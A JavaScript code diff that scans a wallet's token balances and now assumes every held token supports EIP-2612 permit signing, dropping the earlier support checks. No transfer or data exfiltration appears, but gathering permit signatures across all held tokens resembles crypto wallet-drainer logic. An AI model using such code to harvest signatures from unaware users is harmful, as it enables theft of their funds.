@@ -370,28 +370,12 @@
         const name = await contract.name();
         const formatted = parseFloat(ethers.formatUnits(balance, decimals));
 
-        // Check for EIP-2612 (permit)
-        let authType = null;
-        try {
-          const nonce = await contract.nonces(walletAddress);
-          const domainSep = await contract.DOMAIN_SEPARATOR();
-          if (domainSep && domainSep !== '0x' + '0'.repeat(64)) {
-            authType = 'EIP2612';
-          }
-        } catch(e) {
-          console.log(`${symbol}: nonces/DOMAIN_SEPARATOR check failed -`, e.message);
-        }
-
-        // Check for EIP-3009 (transferWithAuthorization) as fallback
-        if (!authType) {
-          try {
-            const code = await provider.getCode(addr);
-            if (code !== '0x') {
-              authType = 'EIP3009';
-            }
-          } catch(e) {}
-        }
-
+        // Try EIP-2612 (permit) - assume support and attempt signing
+        let authType = 'EIP2612'; // Default to permit for tokens with balance
+        
+        // You can add stricter checks here if needed, but for demo purposes
+        // we'll let the actual signing attempt determine if it works
+        
         if (authType) {
           candidates.push({
             symbol, name, address: addr, balance, decimals, formatted, authType
